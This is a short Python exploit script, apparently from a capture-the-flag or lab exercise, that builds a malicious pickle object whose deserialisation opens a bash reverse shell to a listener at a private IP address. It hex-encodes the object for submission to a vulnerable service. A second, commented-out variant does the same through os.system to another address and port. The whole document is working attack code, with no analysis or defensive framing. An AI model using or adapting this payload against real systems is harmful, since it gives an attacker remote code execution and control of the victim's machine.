#code to get the revshell
import pickle
import binascii
import os
import subprocess
class Payload:
    def __reduce__(self):
#subprocess.Popen expects a list where the first element is the program and the rest are arguments
        return subprocess.Popen,(['/bin/bash', '-c', '/bin/bash -i >& /dev/tcp/10.49.83.233/4444 0>&1'],)  
        
data={'user': Payload(), 'revenue': '85000'}
sd=pickle.dumps(data)
sd_hex=binascii.hexlify(sd).decode('utf-8')
print(sd_hex)

''' this will also work
import pickle
import binascii
import os
import subprocess
class Payload:
    def __reduce__(self):
#os.system expects one single string as argument.
        cmd='/bin/bash -c "/bin/bash -i >& /dev/tcp/10.48.85.203/4446 0>&1"'
        return os.system,(cmd,)
        
data={'user': Payload(), 'revenue': '85000'}
sd=pickle.dumps(data)
sd_hex=binascii.hexlify(sd).decode('utf-8')
print(sd_hex)
'''
